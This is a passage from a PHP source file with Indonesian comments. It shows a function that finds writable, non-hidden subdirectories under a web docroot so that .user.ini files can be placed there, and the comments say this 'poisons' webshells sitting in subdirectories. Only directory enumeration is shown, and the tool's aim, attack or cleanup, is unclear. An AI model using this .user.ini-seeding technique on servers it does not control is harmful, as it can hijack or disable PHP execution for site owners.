   dalamnya (glob depth 1 & 2, skip dir hidden/.*, maks 40 dir per docroot)
   — PHP-FPM mengecek .user.ini di DIR SCRIPT sendiri, jadi webshell yang
   duduk di subdir tetap kena racun walau docroot induknya diputihkan. */
function gsp_subdirs_writable($docroot) {
    $out = array();
    $docroot = rtrim(strval($docroot), '/');
    if ($docroot === '' || !@is_dir($docroot)) return $out;
    $paneldir = rtrim(str_replace('\\', '/', dirname(__FILE__)), '/');
    foreach (array(1, 2) as $depth) {
        $pat = $docroot . ($depth === 1 ? '/*' : '/*/*');
        $gl = @glob($pat, GLOB_ONLYDIR);
        if (!is_array($gl)) continue;
        foreach ($gl as $sd) {
            if (count($out) >= 40) break 2;
            $sd = rtrim($sd, '/');
            $bn = basename($sd);
            if ($bn === '' || $bn[0] === '.') continue;          // skip hidden
            if (strpos(substr($sd, strlen($docroot) + 1), '/.') !== false) continue; // induk hidden
            if (!@is_writable($sd)) continue;
            if (in_array($sd, $out, true)) continue;
